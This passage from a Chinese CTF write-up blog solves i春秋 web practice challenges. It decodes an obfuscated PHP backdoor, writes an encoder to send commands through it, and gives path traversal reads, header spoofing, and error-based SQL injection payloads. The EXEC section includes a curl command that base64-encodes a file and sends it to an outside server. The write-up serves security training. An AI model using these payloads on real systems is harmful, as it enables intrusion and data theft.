class="string">&#x27;&#x27;</span>,$c.$f.$N.$i.$x.$P.$w.$O.$u.$h.$H);<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span>$v=$y(<span class="string">&#x27;&#x27;</span>,$L);$v();<span class="comment">/*</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>这里的代码经过了混淆，我们在代码末尾加上一段代码来进行分析：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> var_dump($L);</span><br><span class="line"><span class="keyword">echo</span> $y;</span><br><span class="line"><span class="keyword">echo</span> $v;</span><br></pre></td></tr></table></figure>
<p>得到原本的核心代码 (<code>$L</code>)：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$kh=<span class="string">&quot;4f7f&quot;</span>;</span><br><span class="line">$kf=<span class="string">&quot;28d7&quot;</span>;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params">$t,$k</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $c=strlen($k);</span><br><span class="line">    $l=strlen($t);</span><br><span class="line">    $o=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>; $i&lt;$l;)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>($j=<span class="number">0</span>; ($j&lt;$c&amp;&amp;$i&lt;$l); $j++,$i++)</span><br><span class="line">        &#123;</span><br><span class="line">            $o.=$t&#123;$i&#125;^$k&#123;$j&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $o;</span><br><span class="line">&#125;$r=$_SERVER;</span><br><span class="line">$rr=@$r[<span class="string">&quot;HTTP_REFERER&quot;</span>];</span><br><span class="line">$ra=@$r[<span class="string">&quot;HTTP_ACCEPT_LANGUAGE&quot;</span>];</span><br><span class="line"><span class="keyword">if</span>($rr&amp;&amp;$ra)</span><br><span class="line">&#123;</span><br><span class="line">    $u=parse_url($rr);</span><br><span class="line">    parse_str($u[<span class="string">&quot;query&quot;</span>],$q);</span><br><span class="line">    $q=array_values($q);</span><br><span class="line">    preg_match_all(<span class="string">&quot;/([\w])[\w-]+(?:;q=0.([\d]))?,?/&quot;</span>,$ra,$m);</span><br><span class="line">    <span class="keyword">if</span>($q&amp;&amp;$m)</span><br><span class="line">    &#123;</span><br><span class="line">        @session_start();</span><br><span class="line">        $s=&amp;$_SESSION;</span><br><span class="line">        $i=$m[<span class="number">1</span>][<span class="number">0</span>].$m[<span class="number">1</span>][<span class="number">1</span>];</span><br><span class="line">        $h=strtolower(substr(md5($i.$kh),<span class="number">0</span>,<span class="number">3</span>));</span><br><span class="line">        $f=strtolower(substr(md5($i.$kf),<span class="number">0</span>,<span class="number">3</span>));</span><br><span class="line">        $p=<span class="string">&quot;&quot;</span>;</span><br><span class="line">        <span class="keyword">for</span>($z=<span class="number">1</span>; $z&lt;count($m[<span class="number">1</span>]); $z++)$p.=$q[$m[<span class="number">2</span>][$z]];</span><br><span class="line">        <span class="keyword">if</span>(strpos($p,$h)===<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            $s[$i]=<span class="string">&quot;&quot;</span>;</span><br><span class="line">            $p=substr($p,<span class="number">3</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(array_key_exists($i,$s))</span><br><span class="line">        &#123;</span><br><span class="line">            $s[$i].=$p;</span><br><span class="line">            $e=strpos($s[$i],$f);</span><br><span class="line">            <span class="keyword">if</span>($e)</span><br><span class="line">            &#123;</span><br><span class="line">                $k=$kh.$kf;</span><br><span class="line">                ob_start();</span><br><span class="line">                <span class="comment">//！</span></span><br><span class="line">                @<span class="keyword">eval</span>(@gzuncompress(@x(@base64_decode(preg_replace(<span class="keyword">array</span>(<span class="string">&quot;/_/&quot;</span>,<span class="string">&quot;/-/&quot;</span>),<span class="keyword">array</span>(<span class="string">&quot;/&quot;</span>,<span class="string">&quot;+&quot;</span>),substr($s[$i],<span class="number">0</span>,$e))),$k)));</span><br><span class="line">                $o=ob_get_contents();</span><br><span class="line">                ob_end_clean();</span><br><span class="line">                $d=base64_encode(x(gzcompress($o),$k));</span><br><span class="line">                <span class="keyword">print</span>(<span class="string">&quot;&lt;<span class="subst">$k</span>&gt;<span class="subst">$d</span>&lt;/<span class="subst">$k</span>&gt;&quot;</span>);</span><br><span class="line">                @session_destroy();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>代码的重点在于 <code>Accept-Language</code>，<code>Referer</code> 和感叹号所在的行，因为可以用 <code>eval</code> 执行代码。</p>
<p>首先 <code>x</code> 函数显然是循环异或。随后仔细阅读 <code>preg_match_all</code> 的正则表达式，发现它将 <code>Accept-Language</code> 分成了 3 部分，<code>m[0]</code> 存每种语言的完整字符串，<code>m[1]</code> 存首字母，<code>m[2]</code> 存语言权重小数点后的数字。</p>
<blockquote>
<p>Accept-Language 格式：<code>语言;q=权重</code>，例如 <code>en-US;q=0.5</code></p>
</blockquote>
<p>而 <code>$i</code> 取的是 <code>$m[1][0].$m[1][1]</code>，也就是前两种语言的首字母。<code>$h</code> 和 <code>$f</code> 不难计算，我们假设输入的语言是 <code>zh-CN,zh</code>，那么 <code>$i</code> 就是 <code>zz</code>，计算得到 <code>$h</code> 为 <code>675</code>，<code>$f</code> 为 <code>a3e</code>。</p>
<p>不过下面的 <code>for</code> 循环有点绕：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span>($z=<span class="number">1</span>; $z&lt;count($m[<span class="number">1</span>]); $z++)</span><br><span class="line">  $p.=$q[$m[<span class="number">2</span>][$z]];</span><br></pre></td></tr></table></figure>
<p><code>$z</code> 指当前是第几种语言，<code>$m[2][$z]</code> 就是该语言权重的小数点后第一位，以这个值为索引取得 <code>Referer</code> 的 url 中 query string 里对应索引的那个参数值拼接到 <code>$p</code> 上。</p>
<p>下面的 <code>if</code> 判断 <code>$p</code> 是不是以 <code>$h</code> 开头 <code>$f</code> 结尾，如果是则进入下面的 <code>eval</code> 函数，我们才能实现命令注入。<code>eval</code> 函数内是一个简单的写逆向函数的过程。</p>
<p>脚本：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 照搬</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params">$t,$k</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $c=strlen($k);</span><br><span class="line">    $l=strlen($t);</span><br><span class="line">    $o=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>; $i&lt;$l;)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>($j=<span class="number">0</span>; ($j&lt;$c&amp;&amp;$i&lt;$l); $j++,$i++)</span><br><span class="line">        &#123;</span><br><span class="line">            $o.=$t&#123;$i&#125;^$k&#123;$j&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $o;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">inject</span>(<span class="params">$cmd</span>) </span>&#123;</span><br><span class="line">    $payload = base64_encode(x(gzcompress($cmd), <span class="string">&quot;4f7f28d7&quot;</span>));</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;675&quot;</span>.$payload.<span class="string">&quot;a3e&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> inject(<span class="string">&#x27;system(&quot;ls&quot;);&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>将得到的字符串放在 <code>Referer</code> 的第一个参数里，设置请求头：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.0</span><br><span class="line">Referer: http:&#x2F;&#x2F;12.12.12.12&#x2F;index.php?a&#x3D;675TPocyB4WLfrhNv1PZOrQMTREimJna3e</span><br></pre></td></tr></table></figure>
<p>得到经过编码的返回值：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">TPp8VHv2Kv4DTuVN+hCEff8ve2EBCpdlZk33ypDEwMumBIr0uCrKpbiq1Z5+6xyPHma96ydT</span><br></pre></td></tr></table></figure>
<p>再写脚本解码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">// 照搬</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">x</span>(<span class="params">$t,$k</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    $c=strlen($k);</span><br><span class="line">    $l=strlen($t);</span><br><span class="line">    $o=<span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">for</span>($i=<span class="number">0</span>; $i&lt;$l;)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span>($j=<span class="number">0</span>; ($j&lt;$c&amp;&amp;$i&lt;$l); $j++,$i++)</span><br><span class="line">        &#123;</span><br><span class="line">            $o.=$t&#123;$i&#125;^$k&#123;$j&#125;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> $o;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">dec</span>(<span class="params">$out</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> gzuncompress(x(base64_decode($out), <span class="string">&#x27;4f7f28d7&#x27;</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> dec(<span class="string">&#x27;TPp8VHv2Kv4DTuVN+hCEff8ve2EBCpdlZk33ypDEwMumBIr0uCrKpbiq1Z5+6xyPHma96ydT&#x27;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>得到解码后的返回值：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">b4ckdo0r.php flag.php index.php robots.txt this_i5_flag.php</span><br></pre></td></tr></table></figure>
<p>然后执行命令 <code>cat this_i5_flag.php</code>，和上面一样的方法编码后发送得到编码后的 flag，再用同样方法解码即可。最后 flag 在页面注释中。</p>
<h2 id="GetFlag"><a href="#GetFlag" class="headerlink" title="GetFlag"></a>GetFlag</h2><p>熟悉的爆破 md5 套路：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib, sys</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>**<span class="number">5</span>, <span class="number">10</span>**<span class="number">8</span>):</span><br><span class="line">    val = hashlib.md5(<span class="built_in">str</span>(i)).hexdigest()</span><br><span class="line">    <span class="keyword">if</span> val[:<span class="number">6</span>] == sys.argv[<span class="number">1</span>]:</span><br><span class="line">        print(i)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure>
<p>用户名可以直接注入，密码任意。登录后可以看到三个文件。提示说 flag 在 web 根目录。注意到文件的下载 url 为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;Challenges&#x2F;file&#x2F;download.php?f&#x3D;a.php</span><br></pre></td></tr></table></figure>
<p>可以尝试下载 <code>flag.php</code>，但是显示 <code>flag&#123;wow!!!but not true&#125;</code>。猜想这里可能不能使用相对路径，换成绝对路径：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;Challenges&#x2F;file&#x2F;download.php?f&#x3D;&#x2F;var&#x2F;www&#x2F;html&#x2F;Challenges&#x2F;flag.php</span><br></pre></td></tr></table></figure>
<p>得到源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$f = $_POST[<span class="string">&#x27;flag&#x27;</span>];</span><br><span class="line">$f = str_replace(<span class="keyword">array</span>(<span class="string">&#x27;`&#x27;</span>,<span class="string">&#x27;$&#x27;</span>,<span class="string">&#x27;*&#x27;</span>,<span class="string">&#x27;#&#x27;</span>,<span class="string">&#x27;:&#x27;</span>,<span class="string">&#x27;\\&#x27;</span>,<span class="string">&#x27;&quot;&#x27;</span>,<span class="string">&quot;&#x27;&quot;</span>,<span class="string">&#x27;(&#x27;</span>,<span class="string">&#x27;)&#x27;</span>,<span class="string">&#x27;.&#x27;</span>,<span class="string">&#x27;&gt;&#x27;</span>),<span class="string">&#x27;&#x27;</span>, $f);</span><br><span class="line"><span class="keyword">if</span>((strlen($f) &gt; <span class="number">13</span>) || (<span class="literal">false</span> !== stripos($f,<span class="string">&#x27;return&#x27;</span>)))</span><br><span class="line">&#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;wowwwwwwwwwwwwwwwwwwwwwwwww&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">try</span></span><br><span class="line">&#123;</span><br><span class="line">		 <span class="keyword">eval</span>(<span class="string">&quot;\$spaceone = <span class="subst">$f</span>&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">catch</span> (<span class="built_in">Exception</span> $e)</span><br><span class="line">&#123;</span><br><span class="line">		<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> ($spaceone ===<span class="string">&#x27;flag&#x27;</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> file_get_contents(<span class="string">&quot;helloctf.php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>。。。看似过滤一大堆，实际上直接 POST 提交 <code>flag=flag;</code> 就完了，需要注意的就是最后的分号。</p>
<h2 id="Not-Found"><a href="#Not-Found" class="headerlink" title="Not Found"></a>Not Found</h2><p>首页直接跳转到不存在的 <code>404.php</code>，在响应头中发现 <code>X-Method: haha</code> 字段。一次尝试 HTTP 方法，当使用 <code>OPTIONS</code> 时，发现响应头中多出了 <code>Location: ?f=1.php</code> 字段。对这个 url 也进行 <code>OPTIONS</code> 请求，得到一段源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	$msg = <span class="string">&quot;not here&quot;</span>;</span><br><span class="line">	$msg .= PHP_EOL;</span><br><span class="line">	$msg .=<span class="string">&quot;plz trying&quot;</span>;</span><br><span class="line">  <span class="keyword">echo</span> $msg;</span><br></pre></td></tr></table></figure>
<p>直接访问 <code>1.php</code> 发现这就是 <code>1.php</code> 的源码。猜测这个 <code>f</code> 参数的功能就是文件读取，尝试 <code>index.php</code> 发现不允许。最后发现 <code>.htaccess</code> 却可以读：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">RewriteEngine On</span><br><span class="line">RewriteBase &#x2F;</span><br><span class="line">RewriteRule ^8d829d8568e46455104209db5cd9228d.html$ 404.php [L]</span><br></pre></td></tr></table></figure>
<p>因此我们访问这个 html 得到提示，修改 XFF 头，但是无效。因此我们换而修改 <code>client-ip</code> 头为 <code>127.0.0.1</code> 得到 flag。</p>
<h2 id="Vld"><a href="#Vld" class="headerlink" title="Vld"></a>Vld</h2><p>F12 得到提示 <code>index.php.txt</code>，访问得到了一个看不太懂的文件，似乎是 php 的 opcode。耐心分析还是不难理解的，需要三个 GET 参数 <code>flag1, flag2, flag3</code>，分别等于 <code>fvhjjihfcv, gfuyiyhioyf, yugoiiyhi</code>。访问新 url 可以下载到源码。</p>
<p>观察源码发现关键的地方在于：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* dbmysql.class.php */</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">my_md5</span>(<span class="params">$string</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> md5(substr(md5($string),<span class="number">5</span>,<span class="number">24</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">safe_data</span>(<span class="params">$value</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(MAGIC_QUOTES_GPC)&#123;</span><br><span class="line">        stripcslashes($value);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> addslashes($value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* login.php */</span></span><br><span class="line">$username = $db-&gt;safe_data($_POST[<span class="string">&#x27;username&#x27;</span>]);</span><br><span class="line">$password = $db-&gt;my_md5($_POST[<span class="string">&#x27;password&#x27;</span>]);</span><br><span class="line">$number = is_numeric($_POST[<span class="string">&#x27;number&#x27;</span>]) ? $_POST[<span class="string">&#x27;number&#x27;</span>] : <span class="number">1</span>;</span><br><span class="line">$username = trim(str_replace($number,<span class="string">&#x27;&#x27;</span>, $username));</span><br><span class="line">$sql = <span class="string">&quot;select * from&quot;</span>.<span class="string">&quot;`&quot;</span>.table_name.<span class="string">&quot;`&quot;</span>.<span class="string">&quot;where username=&quot;</span>.<span class="string">&quot;&#x27;&quot;</span>.<span class="string">&quot;<span class="subst">$username</span>&quot;</span>.<span class="string">&quot;&#x27;&quot;</span>;</span><br></pre></td></tr></table></figure>
<p>这里可以看到 <code>username</code> 会先被 <code>addslashes</code>，然后其中和 <code>number</code> 相同的部分会被去掉。这样我们就能让 <code>&#39;</code> 逃过转义，当我们提交 <code>username=%00&#39;</code> 时，会被 <code>addslashes</code> 转义为 <code>\0\&#39;</code>，如果 <code>number=0</code>，则其中的 0 会被替换掉变成 <code>\\&#39;</code>，此时第二个 <code>\</code> 被转义，原 SQL 语句变为 <code>where username=&#39;\\&#39;</code>，成功闭合。</p>
<p>然后就是报错注入，注意语句中不能再出现 <code>0</code> 了：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">number&#x3D;0&amp;username&#x3D;%00&#39;or updatexml(1,concat(hex(126),(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()),hex(126)),1)#&amp;password&#x3D;ccc&amp;submit&#x3D;</span><br><span class="line"></span><br><span class="line">number&#x3D;0&amp;username&#x3D;%00&#39;or updatexml(1,concat(hex(126),(select flag from flag),hex(126)),1)#&amp;password&#x3D;ccc&amp;submit&#x3D;</span><br><span class="line"></span><br><span class="line">number&#x3D;0&amp;username&#x3D;%00&#39;or updatexml(1,concat(hex(126),substr((select flag from flag),21,99),hex(126)),1)#&amp;password&#x3D;ccc&amp;submit&#x3D;</span><br></pre></td></tr></table></figure>

<h2 id="EXEC"><a href="#EXEC" class="headerlink" title="EXEC"></a>EXEC</h2><p>F12 在 html 的 head 标签中发现 <code>editor=&quot;vim&quot;</code>，显然能下载 <code>.index.php.swp</code>：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">flag in flag233.php</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params">$number</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        $one = ord(<span class="string">&#x27;1&#x27;</span>);</span><br><span class="line">        $nine = ord(<span class="string">&#x27;9&#x27;</span>);</span><br><span class="line">        <span class="keyword">for</span> ($i = <span class="number">0</span>; $i &lt; strlen($number); $i++)</span><br><span class="line">        &#123;</span><br><span class="line">                $digit = ord($number&#123;$i&#125;);</span><br><span class="line">                <span class="keyword">if</span> (($digit&gt;= $one) &amp;&amp; ($digit &lt;= $nine) )</span><br><span class="line">                &#123;</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">        &#125;</span><br><span class="line">           <span class="keyword">return</span> $number == <span class="string">&#x27;11259375&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[sign])&amp;&amp; check($_GET[sign]))&#123;</span><br><span class="line">        setcookie(<span class="string">&#x27;auth&#x27;</span>,<span class="string">&#x27;tcp tunnel is forbidden!&#x27;</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;cmd&#x27;</span>]))&#123;</span><br><span class="line">                $command=$_POST[cmd];</span><br><span class="line">                $result=exec($command);</span><br><span class="line">                <span class="comment">//echo $result;</span></span><br><span class="line">        &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;no sign&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>首先需要一个 GET 参数，其值为 <code>11259375</code> 但不能包含 <code>1-9</code> 中的数字。注意到这里的弱比较，可以将该数字转为十六进制，恰好为 <code>0xabcdef</code>，不包含 <code>1-9</code>，因此提交 <code>?sign=0xabcdef</code> 可以发现 <code>no sign</code> 的提示没有了。</p>
<p>接下来在保留刚才的参数的同时 POST 命令就可以执行了，但是没有回显，猜想是通过 <code>nc</code> 把 <code>flag233.php</code> 反弹到自己的服务器上，并且需要走 UDP，但是最终没有成功。最终采用了 curl 的方法，把文件内容 base64 编码后放在 url 里向服务器发送请求，并在日志中查看 flag。payload：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd&#x3D;data&#x3D;$(cat flag233.php | base64);curl http:&#x2F;&#x2F;xx.xx.xx.xx?data&#x3D;$data;</span><br></pre></td></tr></table></figure>
<p>在 <code>access.log</code> 中即可得到编码后的 <code>flag233.php</code>。</p>
</div><div class="article-licensing box"><div class="licensing-title"><p>i 春秋 Web 入门练习 Part I.</p><p><a href="https://signormercurio.me/post/IcqWeb/">https://signormercurio.me/post/IcqWeb/</a></p></div><div class="licensing-meta level is-mobile"><div class="level-left"><div class="level-item is-narrow"><div><h6>Author</h6><p>Mercury</p></div></div><div class="level-item is-narrow"><div><h6>Posted on</h6><p>2019-08-24</p></div></div><div class="level-item is-narrow"><div><h6>Licensed under</h6><p><a class="icon" rel="noopener" target="_blank" title="Creative Commons" href="https://creativecommons.org/"><i class="fab fa-creative-commons"></i></a><a class="" rel="noopener" target="_blank" title="CC BY-NC-SA 4.0" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a></p></div></div></div></div></div><div class="article-tags is-size-7 mb-4"><span class="mr-2">#</span><a class="link-muted mr-2" rel="tag" href="/tags/%E5%8F%A4%E5%85%B8%E5%AF%86%E7%A0%81%E4%B8%8E%E7%BC%96%E7%A0%81/">古典密码与编码</a><a class="link-muted mr-2" rel="tag" href="/tags/SQLi/">SQLi</a><a class="link-muted mr-2" rel="tag" href="/tags/%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/">文件上传</a><a class="link-muted mr-2" rel="tag" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">反序列化</a><a class="link-muted mr-2" rel="tag" href="/tags/Hash/">Hash</a><a class="link-muted mr-2" rel="tag" href="/tags/PHP/">PHP</a></div><!--!--></article></div><!--!--><nav class="post-navigation mt-4 level is-mobile"><div class="level-start"><a class="article-nav-prev level level-item link-muted" href="/post/ISG2019/"><i class="level-item fas fa-chevron-left"></i><span class="level-item">ISG2019 线上赛部分记录</span></a></div><div class="level-end"><a class="article-nav-next level level-item link-muted" href="/post/ShiYanBaWeb/"><span class="level-item">实验吧 Web 练习</span><i class="level-item fas fa-chevron-right"></i></a></div></nav><div class="card"><div class="card-content"><h3 class="title is-5">Comments</h3><div class="content" id="valine-thread"></div><script src="//cdn1.lncld.net/static/js/3.0.4/av-min.js"></script><script src="https://cdn.jsdelivr.net/npm/valine@1.4.14/dist/Valine.min.js"></script><script>new Valine({
            el: '#valine-thread' ,
            appId: "RkxCznUcvfzFBgfMiMr0BAfd-gzGzoHsz",
            appKey: "sw2sEPOl4haCAXKUFYiBFMrR",
            placeholder: "Leave comments here...",
            avatar: "mm",
            
            meta: ["nick","mail","link"],
            pageSize: 10,
            lang: "en",
            visitor: true,
            highlight: true,
            
            
            
            
            
            requiredFields: ["nick","mail"],
